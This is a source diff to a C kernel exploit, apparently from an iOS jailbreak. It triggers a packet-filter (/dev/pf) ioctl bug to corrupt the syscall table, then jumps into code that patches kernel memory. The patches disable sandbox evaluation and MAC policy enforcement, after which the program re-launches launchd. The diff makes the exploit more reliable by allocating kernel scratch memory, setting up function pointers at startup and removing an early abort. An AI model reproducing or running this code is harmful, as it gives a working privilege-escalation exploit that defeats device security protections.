@@ -25,7 +25,7 @@
 #define assert(x) do { if(!(x)) abort(); } while(0)
 #endif
 
-#if 1
+#if 0
 #undef assert
 #define assert(x) do { if(!(x)) failz(__LINE__); } while(0)
 
@@ -93,24 +93,33 @@ static void pwn(unsigned int addr) {
 extern void patch_start();
 extern void patch_end();
 
-static void (*flush_dcache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_FLUSH_DCACHE;
-static void (*invalidate_icache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_INVALIDATE_ICACHE;
-static void (*copyin)(void *uaddr, void *kaddr, size_t len) = (void *) CONFIG_COPYIN;
-static void (*IOLog)(char *fmt, ...) = (void *) CONFIG_IOLOG;
+static void (*flush_dcache)(void *addr, unsigned size, bool phys);
+static void (*invalidate_icache)(void *addr, unsigned size, bool phys);
+static void (*copyin)(void *uaddr, void *kaddr, size_t len);
+static void (*IOLog)(char *fmt, ...);
+static void *(*kalloc)(unsigned int size);
+__attribute__((constructor))
+static void init_funcptrs() {
+    flush_dcache = (void *) CONFIG_FLUSH_DCACHE;
+    invalidate_icache = (void *) CONFIG_INVALIDATE_ICACHE;
+    copyin = (void *) CONFIG_COPYIN;
+    IOLog = (void *) CONFIG_IOLOG;
+    kalloc = (void *) CONFIG_KALLOC;
+}
 
 static inline void flush(void *addr, unsigned size) {
     flush_dcache(addr, size, false);
     invalidate_icache(addr, size, false);
 }
 
-static int ok_go_real(void *p, void *uap, unsigned int *retval) {
+extern int ok_go(void *p, void *uap, unsigned int *retval) {
 #ifdef DEBUG
     IOLog("Whoa, I'm here!...\n");
 #endif
     /**((unsigned int *) (CONFIG_MAC_POLICY_LIST + 8) = 1;
     *((unsigned int *) (CONFIG_MAC_POLICY_LIST + 12) = 2;
     *((unsigned int *) 0xdeadbeef) = 0xdeadf00d;*/
-#   define P(patch) do { *((unsigned int *) CONFIG_##patch) = CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, 4, false); flush((void *) CONFIG_##patch, 4); } while(0)
+#   define P(patch) do { *((volatile unsigned int *) CONFIG_##patch) = CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, 4, false); flush((void *) CONFIG_##patch, 4); } while(0)
 
     P(PATCH1);
     P(PATCH3);
@@ -121,42 +130,42 @@ static int ok_go_real(void *p, void *uap, unsigned int *retval) {
     flush((void *) CONFIG_SYSENT_PATCH, 4);
 
     unsigned int copysize = (char *)(&patch_end) - (char *)(&patch_start);
-#define CONFIG_SCRATCH 42
-    copyin(&patch_start, (void *) CONFIG_SCRATCH, copysize);
-    flush((void *) CONFIG_SCRATCH, copysize);
+    void *scratch = kalloc(0x1000);
+    copyin(&patch_start, scratch, copysize);
+    flush(scratch, copysize);
     
     // *this* won't work on thumb-1...
     *((unsigned int *) CONFIG_SB_EVALUATE) = 0xf000f8df; // ldr pc, [pc]
-    *((unsigned int *) (CONFIG_SB_EVALUATE + 4)) = CONFIG_SCRATCH | 1;
+    *((unsigned int *) (CONFIG_SB_EVALUATE + 4)) = (unsigned int)scratch | 1;
     flush((void *) CONFIG_SB_EVALUATE, 8);
     
     return 0;
 
 }
 
-// :(
-__attribute__((section("__HIGHROAD,__highroad"), naked, used))
-static int ok_go(void *p, void *uap, unsigned int *retval) {
-    unsigned int ok = ((unsigned int) &ok_go_real) | 1;
-    asm("bx %0" :: "r"(ok));
-}
-
 int main() {
     unsigned int target_addr = CONFIG_TARGET_ADDR;
+    unsigned int target_addr_real = target_addr & ~1;
     unsigned int target_pagebase = target_addr & ~0xfff;
     unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
+    assert(MAP_FAILED != mmap((void *)target_pagebase, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
+    *((unsigned int *) target_addr_real) = 0xf000f8df; // ldr pc, [pc]
+    *((unsigned int *) (target_addr_real + 4)) = (unsigned int)&ok_go | 1;
+    assert(!mprotect((void *)target_pagebase, 0x2000, PROT_READ | PROT_EXEC));
+    
     // Yes, reopening is necessary
     pffd = open("/dev/pf", O_RDWR);
     ioctl(pffd, DIOCSTOP);
     assert(!ioctl(pffd, DIOCSTART));
+    unsigned int sysent_patch = CONFIG_SYSENT_PATCH;
     while(num_decs--)
-        pwn(CONFIG_SYSENT_PATCH+3);
+        pwn(sysent_patch+3);
     assert(!ioctl(pffd, DIOCSTOP));
     close(pffd);
     
-    assert(!mlock((void *) ((unsigned int)(&ok_go_real) & ~0xfff), 0x1000));
-    assert(!mlock((void *) ((unsigned int)(&flush) & ~0xfff), 0x1000));
     assert(!mlock((void *) ((unsigned int)(&ok_go) & ~0xfff), 0x1000));
+    assert(!mlock((void *) ((unsigned int)(&flush) & ~0xfff), 0x1000));
+    assert(!mlock((void *) target_pagebase, 0x2000));
 #ifdef DEBUG
     printf("ok\n"); fflush(stdout);
 #endif
@@ -169,8 +178,6 @@ int main() {
     int one = 1;
     assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));
 
-    failz(42);
-    return 0;
     setenv("DYLD_INSERT_LIBRARIES", "", 1);
     execl("/sbin/launchd", "/sbin/launchd", NULL);
 }
